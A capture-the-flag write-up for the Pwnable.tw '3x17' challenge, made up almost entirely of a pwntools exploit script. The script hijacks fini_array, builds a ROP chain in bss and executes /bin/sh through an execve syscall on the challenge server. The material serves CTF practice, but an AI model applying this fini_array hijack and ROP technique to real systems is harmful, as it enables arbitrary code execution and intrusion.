# Pwnable.tw - 3x17

* Website : Pwnable.tw
* Challenge : 3x17
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
1. **libc_csu_init**
2. **libc_csu_fini**
3. **init_array**
4. **fini_array**
5. **ROP on bss**

## 0x01
Exploit:
```python
from pwn import *

#r = process('./3x17')
r = remote('chall.pwnable.tw', 10105)

def addr(addr):
    r.recvuntil(":")
    r.send(addr)

def data(data):
    r.recvuntil(":")
    r.send(data)

def main():
    fini_array = 0x4b40f0
    libc_csu_fini = 0x402960
    main = 0x401b6d
    pop_rdi_ret = 0x401696
    pop_rsi_ret = 0x406c30
    pop_rdx_ret = 0x446e35
    pop_rax_ret = 0x41e4af
    syscall = 0x471db5
    leave_ret = 0x401c4b
    push_rsi = 0x460c1c
    segment = 0x4b4100
    #first time hijack RIP
    addr(str(fini_array))
    data(p64(libc_csu_fini)+p64(main))
    #second time set ROP
    addr(str(0x4b4000))
    data(("/bin/sh\0"))
    addr(str(segment))
    data(p64(pop_rdi_ret))
    addr(str(segment+8))
    data(p64(0x4b4000))
    addr(str(segment+16))
    data(p64(pop_rsi_ret))
    addr(str(segment+24))
    data(str("\0"))
    addr(str(segment+32))
    data(p64(pop_rdx_ret))
    addr(str(segment+40))
    data(str("\0"))
    addr(str(segment+48))
    data(p64(pop_rax_ret))
    addr(str(segment+56))
    data(p64(0x3b))
    addr(str(segment+64))
    data(p64(syscall))
    #back to bss
    addr(str(fini_array))
    data(p64(leave_ret)+p64(main))
    r.interactive()

if __name__ == '__main__':
    main()
```
